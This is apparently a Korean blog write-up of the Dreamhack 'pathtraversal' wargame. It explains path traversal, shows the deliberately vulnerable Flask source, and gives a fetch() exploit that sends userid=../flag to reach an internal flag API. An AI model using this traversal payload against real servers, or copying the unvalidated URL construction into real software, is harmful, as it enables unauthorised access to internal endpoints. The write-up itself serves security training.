---
title: Dreamhack pathtraversal 풀이
description: https://dreamhack.io/wargame/challenges/12
category: Dreamhack Web
tags:
  - WebHacking
  - Web
  - Wargame
  - Dreamhack
createdAt: 2026-11-04
updatedAt: 2026-11-04
draft: false
---
# DH - Pathtraversal

## 문제:

![image.png](/images/image-1.png)

link: [https://dreamhack.io/wargame/challenges/12](https://dreamhack.io/wargame/challenges/12)



## Path Traversal 취약점이란?

**Path Traversal(경로 탐색 취약점)**은 `../`와 같은 경로 이동 문자열을 이용하여 정상적으로 접근할 수 없는 파일이나 디렉터리, URL 경로에 접근하는 취약점이다.

사용자 입력값에 대한 검증이 제대로 이루어지지 않을 때 발생하며, 이를 악용하면 서버 내부의 민감한 정보를 열람하거나 접근이 제한된 경로에 접근할 수 있다.



## 소스 코드:

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, abort
from functools import wraps
import requests
import os, json

users = {
    '0': {
        'userid': 'guest',
        'level': 1,
        'password': 'guest'
    },
    '1': {
        'userid': 'admin',
        'level': 9999,
        'password': 'admin'
    }
}

def internal_api(func):
    @wraps(func)
    def decorated_view(*args, **kwargs):
        if request.remote_addr == '127.0.0.1':
            return func(*args, **kwargs)
        else:
            abort(401)
    return decorated_view

app = Flask(__name__)
app.secret_key = os.urandom(32)
API_HOST = 'http://127.0.0.1:8000'

try:
    FLAG = open('./flag.txt', 'r').read() # Flag is here!!
except:
    FLAG = '[**FLAG**]'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/get_info', methods=['GET', 'POST'])
def get_info():
    if request.method == 'GET':
        return render_template('get_info.html')
    elif request.method == 'POST':
        userid = request.form.get('userid', '')
        info = requests.get(f'{API_HOST}/api/user/{userid}').text
        return render_template('get_info.html', info=info)

@app.route('/api')
@internal_api
def api():
    return '/user/<uid>, /flag'

@app.route('/api/user/<uid>')
@internal_api
def get_flag(uid):
    try:
        info = users[uid]
    except:
        info = {}
    return json.dumps(info)

@app.route('/api/flag')
@internal_api
def flag():
    return FLAG

application = app # app.run(host='0.0.0.0', port=8000)
# Dockerfile
#     ENTRYPOINT ["uwsgi", "--socket", "0.0.0.0:8000", "--protocol=http", "--threads", "4", "--wsgi-file", "app.py"]
```



## 풀이 시도: 

![image.png](/images/image-2.png)

일단 웹에 들어오면 이런 화면을 볼 수 있다. 해당 화면에서 `user id`를 `guest`로 해놓고 `view`를 누르게 되면..



![image.png](/images/image-3.png)

위 사진과 같은 값이 출력이 된다. `userid`에 `guest`를 넣으면 키 값이 0으로 처리되어 저런 딕셔너리 형태가 출려된다. 그래서 `userid`에 `admin`을 넣어서 해보면..



![image.png](/images/image-4.png)

위와 같이 `admin`관련 정보가 출력된다.



```python
users = {
    '0': {
        'userid': 'guest',
        'level': 1,
        'password': 'guest'
    },
    '1': {
        'userid': 'admin',
        'level': 9999,
        'password': 'admin'
    }
}
```

이 소스 코드의 정보가 출력이 된것이다. 그러면 뻘짓은 그만하고 이 문제를 어떻게 풀어야하는지 확인해보자.



소스코드에서 **pathtraversal** 취약점이 발생할 수 있는 부분은 다음과 같다.

```python
@app.route('/get_info', methods=['GET', 'POST'])
def get_info():
    if request.method == 'GET':
        return render_template('get_info.html')
    elif request.method == 'POST':
        userid = request.form.get('userid', '')
        info = requests.get(f'{API_HOST}/api/user/{userid}').text
        return render_template('get_info.html', info=info)
```

`get_info()` 함수에서는 사용자가 POST 요청으로 전달한 `userid` 값을 받아 사용자 정보를 조회하는데, 이때 입력받은 `userid` 값을 별도의 검증 없이 `requests.get()`의 URL 경로에 삽입하고 있어 Path Traversal 취약점이 발생한다.

따라서 `userid`에 `../flag`를 입력하면 `/api/user/../flag`라는 경로가 생성되고, 상위 경로를 의미하는 `../`에 의해 `/api/flag`로 변경된다. 그리고 이것을 이용하면 서버 내부에서 접근이 제한된 `/api/flag`를 요청하도록 유도할 수 있다.



## 익스플로잇 코드:

```
fetch('/get_info', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'userid=../flag'
})
.then(response => response.text())
.then(html => {
    document.open();
    document.write(html);
    document.close();
});
```

`fetch()` 함수를 이용해 `/get_info` 경로로 POST 요청을 보내고, `body`에 `userid=../flag`를 전달하였다.

서버에서는 전달받은 `userid` 값을 URL에 그대로 삽입하므로 `/api/user/../flag` 경로가 생성된다.

이후 `../`에 의해 경로가 정규화되면서 `/api/flag`로 변경되고, 서버 내부에서 해당 API를 호출하게 된다.

마지막으로 `.then()`을 통해 서버의 응답을 받아 문자열로 변환하고, `document.write()`를 이용해 응답 HTML을 웹페이지에 출력하도록 하였다.



&nbsp;

&nbsp;

## 결과:

![image.png](/images/image-5.png)

이렇게 플래그를 얻을 수 있다.

